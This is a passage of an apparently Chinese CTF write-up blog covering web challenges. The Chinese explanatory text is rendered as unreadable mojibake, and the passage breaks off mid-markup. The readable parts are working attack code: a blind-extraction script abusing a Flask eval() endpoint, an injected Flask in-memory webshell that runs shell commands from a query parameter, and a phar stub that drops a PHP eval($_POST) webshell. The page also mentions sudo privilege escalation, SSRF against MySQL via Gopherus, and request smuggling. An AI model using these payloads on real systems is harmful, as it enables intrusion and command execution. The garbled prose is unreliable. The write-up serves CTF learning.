alt="image-20251112191657594"></p><p>ä¸ªäººæ„Ÿè§‰æ­£å¸¸æ¥è¯´åº”è¯¥æ˜¯å‘Šè¯‰äº†flagæ–‡ä»¶è·¯åŠ²ï¼Œç„¶ååœ¨æ¨¡æ¿æ¸²æŸ“æ‰“çš„ä»»æ„æ–‡ä»¶è¯»å–çš„æ—¶å€™ï¼ŒæŸ¥æ‰¾å‘ç°æ²¡æœ‰æƒé™ï¼Œæ‰ä¼šæœ‰æƒ³åˆ°åŠ«æŒç¯å¢ƒå˜é‡ä¸­çš„ccæ¥è¿›è¡Œææƒè¿›è¡Œrceæ¥è¯»å–flagï¼Œä½†æ˜¯wpæ²¡æœ‰è¿™ä¸€å—å°±æ˜¾å¾—ä¸å¤ªè¿è´¯ã€æœ‰æåˆ°ä¸€å˜´ä½†æ˜¯å¤ç°çš„æ—¶å€™æ²¡æœ‰æ„Ÿå—å‡ºæ¥ã€‘ï¼Œåƒä¸‹é¢æŸ¥è¯¢flagç„¶åå¼¹å‡ºæƒé™ä¸å¤Ÿä¹‹ç±»çš„ã€å¤ç°çš„æ—¶å€™æ²¡æœ‰å‡ºç°flagï¼Œæ²¡åŠæ³•éªŒè¯ã€‘ï¼Œç„¶åå†æ‹¿ç€keyå»è¿›è¡Œæ„é€ payloadåˆç†ä¸€ç‚¹ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘å¤ç°çš„æ—¶å€™å¤±è¯¯äº†ï¼Œè·³è¿‡äº†ï¼Œå˜»å˜»</p><p><img src="/../images/image-20251112194342982.png" alt="image-20251112194342982"></p><p><img src="/../images/image-20251112193943019.png" alt="image-20251112193943019"></p><h3 id="è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°"><a href="#è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°" class="headerlink" title="è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°"></a>è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°</h3><h4 id="è€ƒç‚¹ï¼šPython-Flaskå†…å­˜é©¬"><a href="#è€ƒç‚¹ï¼šPython-Flaskå†…å­˜é©¬" class="headerlink" title="è€ƒç‚¹ï¼šPython Flaskå†…å­˜é©¬"></a>è€ƒç‚¹ï¼šPython Flaskå†…å­˜é©¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡è§è¿‡ï¼Ÿæœä¸€ä¸‹ï¼åœ¨/flag</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„é¡µé¢ï¼Œç†Ÿæ‚‰çš„ç›®å½•æ‰«æï¼Œç†Ÿæ‚‰çš„&#x2F;srcï¼Œä¸ä¸€æ ·çš„æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/doit&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def doit():</span><br><span class="line">    e=request.form.get(&#x27;e&#x27;)</span><br><span class="line">    try:</span><br><span class="line">        eval(e)</span><br><span class="line">        return &quot;done!&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;error!&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure><p>å…³æ³¨ç‚¹åœ¨&#x2F;doitè·¯ç”±ä¸‹é¢çš„eval(e)ã€eval()å‡½æ•°â½¤æ¥æ‰§â¾â¼€ä¸ªå­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›è¡¨è¾¾å¼çš„å€¼ã€‚ã€‘æ‰§è¡Œå‘½ä»¤</p><p><img src="/../images/image-20251112194838981.png" alt="image-20251112194838981"></p><p>å°è¯•æ‰§è¡Œå‘½ä»¤å’Œæºç æ˜¾ç¤ºçš„ä¸€æ ·ï¼Œæ˜¾ç¤ºdoneæ— å›æ˜¾</p><p><img src="/../images/image-20251112200056348.png" alt="image-20251112200056348"></p><p>çˆ†ç ´ã€å¸ƒå°”ç›²æ³¨åŸç†ã€‘:</p><p>å®˜æ–¹wpå½“ä¸­çš„è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30667/doit&quot;</span><br><span class="line">chars = &quot;_-&#123;&#125;!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    for c in chars:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            &#x27;e&#x27;: f&#x27;__import__(&quot;os&quot;).system(&quot;&quot;) if open(&quot;/flag&quot;).read()[&#123;i-1&#125;] == &quot;&#123;c&#125;&quot; else 1/0&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        if &quot;done!&quot; in r.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        break  # å†…å±‚ for æ­£å¸¸ç»“æŸï¼ˆæœªæ‰¾åˆ°å­—ç¬¦ï¼‰ï¼Œè®¤ä¸º flag å·²ç»“æŸ</span><br><span class="line"></span><br><span class="line">print(&quot;Final flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>å†…å­˜é©¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/13858</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30667&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 1. æ³¨å…¥å†…å­˜é©¬</span><br><span class="line">url1 = f&quot;&#123;url&#125;/doit&quot;</span><br><span class="line">payload = &#123;</span><br><span class="line">    &#x27;e&#x27;: r&quot;&quot;&quot;eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;&quot;&quot;</span><br><span class="line">         r&quot;&quot;&quot;.before_request_funcs.setdefault(None,[]).append(&quot;&quot;&quot;</span><br><span class="line">         r&quot;&quot;&quot;lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;o&#x27;)).read())&quot;)&quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url1, data=payload, headers=headers)</span><br><span class="line">print(&quot;æ³¨å…¥å“åº”ï¼š&quot;, r.text)</span><br><span class="line"></span><br><span class="line"># 2. åˆ©ç”¨å†…å­˜é©¬æ‰§è¡Œå‘½ä»¤</span><br><span class="line">url2 = f&quot;&#123;url&#125;/?o=cat /flag&quot;</span><br><span class="line">r = requests.get(url2, headers=headers)   # æ³¨æ„ï¼šè¿™é‡Œåº”è¯¥æ˜¯ GET</span><br><span class="line">print(&quot;æ‰§è¡Œç»“æœï¼š&quot;, r.text)</span><br></pre></td></tr></table></figure><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="ã€æœªå®Œæˆã€‘Road-to-Hero"><a href="#ã€æœªå®Œæˆã€‘Road-to-Hero" class="headerlink" title="ã€æœªå®Œæˆã€‘Road to Hero"></a><strong>ã€æœªå®Œæˆã€‘Road to Hero</strong></h3><h4 id="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡"><a href="#è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡"></a>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–é“¾æ„é€ å’Œphpçš„ä¸€äº›ç‰¹æ€§è¿˜æœ‰å‘½ä»¤æ‰§è¡Œç®€å•ç»•è¿‡</h4><h3 id="ã€æœªå®Œæˆã€‘ez-Ref"><a href="#ã€æœªå®Œæˆã€‘ez-Ref" class="headerlink" title="ã€æœªå®Œæˆã€‘ez_Ref"></a>ã€æœªå®Œæˆã€‘<strong>ez_Ref</strong></h3><h4 id="è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜"><a href="#è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜" class="headerlink" title="è€ƒç‚¹ï¼šç®€å•çš„javaååºåˆ—åŒ–é¢˜"></a>è€ƒç‚¹ï¼šç®€å•çš„<strong>java</strong>ååºåˆ—åŒ–é¢˜</h4><h3 id="æ¥getshellé€Ÿåº¦"><a href="#æ¥getshellé€Ÿåº¦" class="headerlink" title="æ¥getshellé€Ÿåº¦!"></a><strong>æ¥</strong>getshellé€Ÿåº¦!</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getshellå°±å®Œäº†ï¼Ÿï¼Ÿæƒ³å•¥å‘¢bro</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ"><a href="#è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ" class="headerlink" title="è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ"></a>è€ƒç‚¹ï¼šphpæ–‡ä»¶ä¸Šä¼ ä¸­ä¸å«phpä»£ç å‘½ä»¤æ‰§è¡Œçš„trickä»¥åŠCVE-2025-32462ææƒ</h4><p>åº”è¯¥æ˜¯æ¨¡ä»¿ç»™çš„é“¾æ¥å‡ºçš„é¢˜ç›®ï¼Œæ–°å§¿åŠ¿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/18584</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™çš„æºç æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å’ŒåŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$allowed_extensions = [&#x27;zip&#x27;, &#x27;bz2&#x27;, &#x27;gz&#x27;, &#x27;xz&#x27;, &#x27;7z&#x27;];</span><br><span class="line">$allowed_mime_types = [</span><br><span class="line">    &#x27;application/zip&#x27;,</span><br><span class="line">    &#x27;application/x-bzip2&#x27;,</span><br><span class="line">    &#x27;application/gzip&#x27;,</span><br><span class="line">    &#x27;application/x-gzip&#x27;,</span><br><span class="line">    &#x27;application/x-xz&#x27;,</span><br><span class="line">    &#x27;application/x-7z-compressed&#x27;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function filter($tempfile)</span><br><span class="line">&#123;</span><br><span class="line">    $data = file_get_contents($tempfile);</span><br><span class="line">    if (</span><br><span class="line">        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||</span><br><span class="line">        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false</span><br><span class="line">    ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123;</span><br><span class="line">    if (is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">        if (filter($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !isset($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">            die(&quot;Nope :&lt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // mimetype check</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $mime_type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line"></span><br><span class="line">        if (!in_array($mime_type, $allowed_mime_types)) &#123;</span><br><span class="line">            die(&#x27;unexpected mimetype&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // ext check</span><br><span class="line">        $ext = strtolower(pathinfo(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        if (!in_array($ext, $allowed_extensions)) &#123;</span><br><span class="line">            die(&#x27;unexpected extension&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &quot;/tmp/&quot; . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]))) &#123;</span><br><span class="line">            echo &quot;File upload success!Please include with &#x27;url&#x27;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;fail&quot;;</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;url&#x27;])) &#123;</span><br><span class="line">    </span><br><span class="line">$include_url = basename($_GET[&#x27;url&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!preg_match(&quot;/\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;</span><br><span class="line">    die(&quot;unexpected extension&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &#x27;/tmp/&#x27; . $include_url;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form enctype=&#x27;multipart/form-data&#x27; method=&#x27;post&#x27;&gt;</span><br><span class="line">    &lt;input type=&#x27;file&#x27; name=&#x27;file&#x27;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112231834565.png" alt="image-20251112231834565"></p><p>ç»™äº†ç™½åå•ï¼Œåç¼€è¢«ç¦ç”¨äº†ï¼Œè¿˜å¯¹å†…å®¹ä¹Ÿåšäº†é™åˆ¶</p><p><img src="/../images/image-20251112232038692.png" alt="image-20251112232038692"></p><p>pharååºåˆ—åŒ–å‡½æ•°å’Œphpä»£ç æ®µ</p><p><img src="/../images/image-20251112232132842.png" alt="image-20251112232132842"></p><p>basenameé™åˆ¶ç›®å½•ç©¿è¶Šï¼ŒåŒ¹é…é™åˆ¶æ–‡ä»¶æ‰©å±•å</p><p><img src="/../images/image-20251112232307542.png" alt="image-20251112232307542"></p><p>æ„é€ pharæ–‡ä»¶å†™é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar=new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php file_put_contents(&quot;/var/www/html/shell.php&quot;,&quot;&lt;?php eval(\$_POST[0]);?&gt;&quot;);__HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.readonly=Off 1.php</span><br><span class="line">php 1.php</span><br><span class="line">gzip -c phar.phar &gt;phar.phar.gz</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112234736198.png" alt="image-20251112234736198"></p><p>è¿›æ¥ä¹‹åå‘ç°æ²¡æœ‰æƒé™æŸ¥çœ‹flagæ–‡ä»¶</p><p><img src="/../images/image-20251112235107258.png" alt="image-20251112235107258"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Dalock/article/details/149343860</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹sudoçš„ç‰ˆæœ¬</p><p><img src="/../images/image-20251112235344212.png" alt="image-20251112235344212"></p><p>æŸ¥çœ‹é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;sudoers</p><p><img src="/../images/image-20251112235533743.png" alt="image-20251112235533743"></p><p>æŸ¥çœ‹è‡ªå·±çš„æƒé™ï¼Œç»™é…ä¸Šasd.asd.asdå°±æœ‰æƒé™äº†</p><p><img src="/../images/image-20251112235702084.png" alt="image-20251112235702084"></p><p><img src="/../images/image-20251112235840515.png" alt="image-20251112235840515"></p><h3 id="Apple-or-android"><a href="#Apple-or-android" class="headerlink" title="Apple or android"></a><strong>Apple or android</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é«˜çº§çš„éªŒè¯ç </span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨"><a href="#è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨"></a>è€ƒç‚¹ï¼šä»£ç å®¡è®¡ssrfï¼Œssrfæ‰“mysqlï¼ŒGopherusä½¿ç”¨è”åŠ¨</h4><p>è¿›æ¥çœ‹åˆ°æœ‰ä¸ªé€‰æ‹©è‹¹æœè¿˜æ˜¯å®‰å“ç™»å½•ï¼Œå°è¯•ç™»é™†å’Œä½¿ç”¨ä¸€ä¸‹åŠŸèƒ½ï¼Œè‹¹æœç™»é™†æœ‰ä¸ªç”Ÿæˆæ ¡éªŒçš„äºŒç»´ç ï¼Œåº·åº·ç»™çš„æºç ï¼ŒæŒ‰åŠŸèƒ½æ¥å®¡äº†ï¼Œæ²¡æœ‰çœ‹åˆ°ç›´æ¥ç»™çš„è·¯ç”±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿›æ¥å…ˆçœ‹çš„index.phpï¼Œå®‰å“ç™»é™†çš„è¯å°±æ˜¯åˆ°login.phpï¼Œè‹¹æœç™»é™†çš„è¯å°±æ˜¯è§¦å‘getQRCode()å‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113191023819.png" alt="image-20251113191023819"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨login.phpå½“ä¸­æ˜¯æ²¡æœ‰ç»™ç™»é™†è·³è½¬çš„ï¼Œå®‰å“äººå°±æ˜¯ç™»é™†å¤±è´¥ä¸ç»™ç™»äº†ï¼Œé‚£ä¹ˆå°±åªèƒ½èµ°è‹¹æœç™»é™†äº†</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113191339428.png" alt="image-20251113191339428"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·Ÿè¿›è‹¹æœç™»é™†è§¦å‘çš„æ•ˆæœï¼Œä»getQRCode()å¼€å§‹--&gt;verify.php--&gt;Auth.phpçš„generateAndDisplayCode()---&gt;ImageProcessor.phpå½“ä¸­çš„å‡½æ•°ï¼Œå‚æ•°å¯æ§ï¼Œå‡½æ•°å¯¹ç›®æ ‡åœ°å€æ— é™åˆ¶è§¦å‘ssrf</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113191559080.png" alt="image-20251113191559080"></p><p><img src="/../images/image-20251113191648181.png" alt="image-20251113191648181"></p><p><img src="/../images/image-20251113193101258.png" alt="image-20251113193101258"></p><p><img src="/../images/image-20251113193140025.png" alt="image-20251113193140025"></p><p><img src="/../images/image-20251113194025720.png" alt="image-20251113194025720"></p><p><img src="/../images/image-20251113194040305.png" alt="image-20251113194040305"></p><p><img src="/../images/image-20251113193940986.png" alt="image-20251113193940986"></p><p><img src="/../images/image-20251113194335647.png" alt="image-20251113194335647"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ok,å®¡è®¡å‡ºæ¥è¯·æ±‚äºŒç»´ç æ—¶å€™å­˜åœ¨ssrfã€åˆ©ç”¨ï¼šè¯·æ±‚çš„æ—¶å€™æ„å»ºæ¶æ„çš„HTTP_X_VERIFY_CODE_URLã€‘ï¼Œssrfå¸¸è§æ‰“çš„redisæ•°æ®åº“ï¼Œç”¨dictæ¥æ¢é’ˆä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸åº”çš„æœåŠ¡</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰“çš„å¸¸è§„çš„6379å›æ˜¾æ­£å¸¸ï¼Œä½†æ˜¯3306çš„æ—¶å€™å›æ˜¾å¼‚å¸¸ï¼Œæ¨æµ‹å­˜åœ¨ç›¸åº”çš„mysqlæ–‡ä»¶ï¼ŒæŸ¥çœ‹å‡ºç°çš„binæ–‡ä»¶</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113200753513.png" alt="image-20251113200753513"></p><p><img src="/../images/image-20251113200547566.png" alt="image-20251113200547566"></p><p><img src="/../images/image-20251113201210351.png" alt="image-20251113201210351"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¡®å®å­˜åœ¨mysqlæœåŠ¡ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥ssrfæ‰“çš„mysqlï¼Œä¸€èˆ¬ç”¨çš„curl æ¥è¿›è¡Œgopherçš„æ”»å‡»ï¼Œä½†æ˜¯å‘¢å‰é¢å®¡è®¡ä»£ç çš„æ—¶å€™æœ‰fsockopen</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„æ˜¯Gopherus3,Gopherusè¦ç”¨python2å°±æ¢æˆä»–äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Esonhugh/Gopherus3</span><br></pre></td></tr></table></figure><p>åšäº†mysqlå†™é©¬å­çš„é™åˆ¶fileprivä¿æŠ¤ï¼Œå°±å¸¸è§„çš„sqlæ³¨å…¥æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where</span><br><span class="line">table_schema=&#x27;ctf_db&#x27;</span><br><span class="line">select * from ctf_db.flags</span><br></pre></td></tr></table></figure><p>ç”¨Gopherus3æ„é€ çš„ç›¸åº”çš„payloadï¼Œåœ¨X-VERIFY-CODE-URLè®¿é—®</p><p>æ³¨æ„æ•°æ®åŒ…å¯èƒ½ä¼šè¢«æˆªæ–­ï¼Œå¯ä»¥ä½¿ç”¨åˆ†æ®µè¯»å–å‡½æ•°å–å‡º</p><p><img src="/../images/image-20251114001108429.png" alt="image-20251114001108429"></p><h3 id="waf-waf"><a href="#waf-waf" class="headerlink" title="waf?waf!"></a><strong>waf?waf!</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/243652.html</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡"><a href="#è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡"></a>è€ƒç‚¹ï¼šhttpè¯·æ±‚èµ°ç§é€ æˆçš„wafç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 